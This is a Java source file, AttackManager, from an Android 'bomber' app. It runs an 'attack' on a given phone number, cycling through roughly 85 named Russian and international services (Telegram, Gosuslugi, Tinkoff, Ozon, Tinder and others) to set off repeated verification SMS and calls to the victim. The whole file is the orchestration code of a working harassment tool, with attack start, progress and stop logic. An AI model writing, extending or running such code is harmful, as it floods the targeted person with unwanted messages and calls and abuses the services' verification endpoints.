package com.dm.bomber;

import android.util.Log;

import com.dm.bomber.services.Askona;
import com.dm.bomber.services.BApteka;
import com.dm.bomber.services.BCS;
import com.dm.bomber.services.Baucenter;
import com.dm.bomber.services.BelkaCar;
import com.dm.bomber.services.Benzuber;
import com.dm.bomber.services.Boxberry;
import com.dm.bomber.services.CarSmile;
import com.dm.bomber.services.ChestnyZnak;
import com.dm.bomber.services.Citimobil;
import com.dm.bomber.services.Citydrive;
import com.dm.bomber.services.Discord;
import com.dm.bomber.services.Dolyame;
import com.dm.bomber.services.Dostavista;
import com.dm.bomber.services.DvaBerega;
import com.dm.bomber.services.EKA;
import com.dm.bomber.services.Eldorado;
import com.dm.bomber.services.Evotor;
import com.dm.bomber.services.FarforCall;
import com.dm.bomber.services.FarforSMS;
import com.dm.bomber.services.Fivepost;
import com.dm.bomber.services.FoodBand;
import com.dm.bomber.services.FriendsClub;
import com.dm.bomber.services.GloriaJeans;
import com.dm.bomber.services.GoldApple;
import com.dm.bomber.services.Gorparkovka;
import com.dm.bomber.services.Gosuslugi;
import com.dm.bomber.services.GreenBee;
import com.dm.bomber.services.HHru;
import com.dm.bomber.services.HiceBank;
import com.dm.bomber.services.Hoff;
import com.dm.bomber.services.InDriver;
import com.dm.bomber.services.Kari;
import com.dm.bomber.services.KazanExpress;
import com.dm.bomber.services.Lenta;
import com.dm.bomber.services.MBK;
import com.dm.bomber.services.MFC;
import com.dm.bomber.services.MTS;
import com.dm.bomber.services.Magnit;
import com.dm.bomber.services.MegaDisk;
import com.dm.bomber.services.MegafonTV;
import com.dm.bomber.services.Metro;
import com.dm.bomber.services.Modulebank;
import com.dm.bomber.services.MoeZdorovie;
import com.dm.bomber.services.Mokka;
import com.dm.bomber.services.MosMetro;
import com.dm.bomber.services.Mozen;
import com.dm.bomber.services.Multiplex;
import com.dm.bomber.services.N1RU;
import com.dm.bomber.services.NearKitchen;
import com.dm.bomber.services.Niyama;
import com.dm.bomber.services.OK;
import com.dm.bomber.services.Olltv;
import com.dm.bomber.services.Ozon;
import com.dm.bomber.services.Premier;
import com.dm.bomber.services.Privileges;
import com.dm.bomber.services.ProstoTV;
import com.dm.bomber.services.Pyaterochka;
import com.dm.bomber.services.RabotaRu;
import com.dm.bomber.services.RendezVous;
import com.dm.bomber.services.RiveGauche;
import com.dm.bomber.services.Robocredit;
import com.dm.bomber.services.Samokat;
import com.dm.bomber.services.SberZvuk;
import com.dm.bomber.services.Sephora;
import com.dm.bomber.services.Service;
import com.dm.bomber.services.Smotrim;
import com.dm.bomber.services.Sokolov;
import com.dm.bomber.services.Sportmaster;
import com.dm.bomber.services.Stolichki;
import com.dm.bomber.services.Sunlight;
import com.dm.bomber.services.Tele2;
import com.dm.bomber.services.Tele2TV;
import com.dm.bomber.services.Telegram;
import com.dm.bomber.services.TikTok;
import com.dm.bomber.services.Tinder;
import com.dm.bomber.services.Tinkoff;
import com.dm.bomber.services.ToGO;
import com.dm.bomber.services.Ukrzoloto;
import com.dm.bomber.services.VKWorki;
import com.dm.bomber.services.Wink;
import com.dm.bomber.services.Yandex;
import com.dm.bomber.services.YandexEda;
import com.dm.bomber.services.Yarche;
import com.dm.bomber.services.YotaTV;
import com.dm.bomber.services.Zdravcity;
import com.dm.bomber.services.Zoloto585;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class AttackManager {
    private static final String TAG = "AttackManager";

    private final Service[] services;

    private Attack attack;
    private final Callback callback;

    public AttackManager(Callback callback) {
        Service.client = new OkHttpClient.Builder()
                .addInterceptor(chain -> {
                    Request request = chain.request();
                    Log.v(TAG, String.format("Sending request %s", request.url()));

                    Response response = chain.proceed(request);
                    Log.v(TAG, String.format("Received response for %s with status code %s",
                            response.request().url(), response.code()));

                    return response;
                }).build();

        this.callback = callback;
        this.services = new Service[]{
                new Kari(), new Modulebank(), new YandexEda(),
                new GloriaJeans(), new Telegram(), new MTS(), new CarSmile(),
                new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
                new Fivepost(), new Askona(), new FarforCall(), new Sephora(),
                new Ukrzoloto(), new Olltv(), new Wink(), new Lenta(),
                new Pyaterochka(), new ProstoTV(), new Multiplex(), new RendezVous(),
                new Zdravcity(), new Robocredit(), new Yandex(), new InDriver(),
                new Tinder(), new Gosuslugi(), new Tele2(), new Zoloto585(),
                new Hoff(), new N1RU(), new Samokat(), new GreenBee(),
                new ToGO(), new Premier(), new Gorparkovka(), new Tinkoff(),
                new MegaDisk(), new KazanExpress(), new FoodBand(),
                new Benzuber(), new Citimobil(), new HHru(), new TikTok(),
                new Ozon(), new MFC(), new EKA(), new OK(), new MBK(),
                new VKWorki(), new Magnit(), new SberZvuk(), new Smotrim(),
                new BApteka(), new HiceBank(), new Evotor(), new Sportmaster(),
                new RiveGauche(), new Yarche(), new Baucenter(), new Dolyame(),
                new GoldApple(), new FriendsClub(), new ChestnyZnak(), new DvaBerega(),
                new MoeZdorovie(), new Sokolov(), new Boxberry(), new Discord(),
                new Privileges(), new NearKitchen(), new Citydrive(), new BelkaCar(),
                new Mozen(), new MosMetro(), new BCS(), new Dostavista(),
                new Metro(), new Niyama(), new RabotaRu(), new Sunlight(),
                new Mokka(), new FarforSMS(), new Stolichki(),
                // TODO: Ostin, ICQ, SushiWok, VoprosRU
        };
    }

    public void performAttack(String phoneCode, String phone, int cycles) {
        attack = new Attack(phoneCode, phone, cycles);
        attack.start();
    }

    public boolean hasAttack() {
        return attack != null && attack.isAlive();
    }

    public void stopAttack() {
        attack.interrupt();
        Service.client.dispatcher().cancelAll();
    }

    public List<Service> getUsableServices(String phoneCode) {
        List<Service> usableServices = new ArrayList<>();

        for (Service service : services) {
            if (service.requireCode == null || service.requireCode.equals(phoneCode) || phoneCode.isEmpty())
                usableServices.add(service);
        }

        return usableServices;
    }

    public interface Callback {
        void onAttackEnd(boolean success);

        void onAttackStart(int serviceCount, int numberOfCycles);

        void onProgressChange(int progress);
    }

    private class Attack extends Thread {
        private final String phoneCode;
        private final String phone;
        private final int numberOfCycles;

        private int progress = 0;

        private CountDownLatch tasks;

        public Attack(String phoneCode, String phone, int cycles) {
            super(phone);

            this.phoneCode = phoneCode;
            this.phone = phone;
            this.numberOfCycles = cycles;
        }

        @Override
        public void run() {
            List<Service> usableServices = getUsableServices(phoneCode);

            callback.onAttackStart(usableServices.size(), numberOfCycles);
            Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone));

            for (int cycle = 0; cycle < numberOfCycles; cycle++) {
                Log.i(TAG, String.format("Started cycle %s", cycle));

                tasks = new CountDownLatch(usableServices.size());

                for (Service service : usableServices) {
                    service.prepare(phoneCode, phone);

                    try {
                        service.run(new okhttp3.Callback() {
                            @Override
                            public void onFailure(@NotNull Call call, @NotNull IOException e) {
                                Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);

                                tasks.countDown();
                                callback.onProgressChange(progress++);
                            }

                            @Override
                            public void onResponse(@NotNull Call call, @NotNull Response response) {
                                if (!response.isSuccessful()) {
                                    Log.i(TAG, String.format("%s returned an error HTTP code: %s",
                                            service.getClass().getName(), response.code()));
                                }

                                tasks.countDown();
                                callback.onProgressChange(progress++);
                            }
                        });
                    } catch (StringIndexOutOfBoundsException e) {
                        callback.onAttackEnd(false);

                        Log.i(TAG, "Invalid number format");
                        return;
                    }
                }

                try {
                    tasks.await();
                } catch (InterruptedException e) {
                    break;
                }
            }

            callback.onAttackEnd(true);
            Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone));
        }
    }
}
